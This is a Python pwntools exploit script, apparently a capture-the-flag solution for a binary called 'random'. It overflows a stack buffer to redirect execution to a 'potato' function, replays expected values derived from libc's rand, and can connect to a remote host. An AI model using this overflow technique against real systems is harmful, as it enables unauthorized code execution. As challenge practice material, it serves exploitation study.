#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import ctypes
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('random')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+402
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def gen(v3, v4):
    return (v3 + v4) % 256


def solve():
    seed = u32("A"*4)
    libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(seed)

    offset = 112 + 8
    v = [0]*10

    ret = 0x0401016 # ret;
    payload = p64(ret) + p64(exe.sym['potato'])
    io.sendline(b'A'*offset + b'B'*(8*2) + payload)

    for i in range(10):
        v3 = int(libc.rand())
        v[i] = gen(v3, seed)

    conv = lambda val: hex(val)
    arr = [conv(i) for i in v]

    expected = [0xffffffe1, 0xef, 0xffffff78, 0xc9, 0xffffff45, 0xdf, 0xffffff2a, 0xffffffa2, 0xd3, 0xffffffe4]
    
    
    for i in range(len(expected)):
        io.sendline(str(ctypes.c_int(expected[i]).value))


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

